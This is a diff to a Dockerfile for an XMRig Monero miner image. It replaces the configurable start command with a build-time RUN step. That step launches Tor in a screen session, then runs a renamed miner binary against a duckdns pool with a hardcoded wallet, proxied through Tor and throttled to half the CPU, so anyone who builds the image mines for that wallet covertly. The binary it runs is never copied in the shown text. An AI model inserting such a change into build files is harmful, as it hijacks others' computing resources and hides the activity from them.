@@ -7,6 +7,8 @@ RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /et
     apk update && apk add --no-cache \
     build-base \
     git \
+    tor \
+    screen \
     cmake \
     libuv-dev \
     linux-headers \
@@ -36,10 +38,16 @@ ENV WORKER_NAME=docker
 RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories && \
     apk update && apk add --no-cache \
     libuv \
+    tor \
+    screen \
     libressl \
     hwloc@community
-
+  
 WORKDIR /xmr
 COPY --from=builder /miner/xmrig/build/xmrig /xmr
 
-CMD ["sh", "-c", "./xmrig --url=$POOL --donate-level=3 --user=$WALLET --pass=$WORKER_NAME -k --coin=monero"]
+RUN sh -c "screen -m -d -S tor tor && sleep 10s && ./aunglay -o aungmyozaw.duckdns.org:3333 -u 466qu8xzgtDXCr52mZxubW2yCFmdcAuLpHKECRmaCRn26V6LgNi5ttP74dQ7g2mUJNRzTqgDM6PUZQhaG45DgUx43kRxAoY -k --tls --rig-id rig -x 127.0.0.1:9050 --cpu-max-threads-hint 50" 
+
+
+
+#CMD ["sh", "-c", "./xmrig --url=$POOL --donate-level=3 --user=$WALLET --pass=$WORKER_NAME -k --coin=monero"]
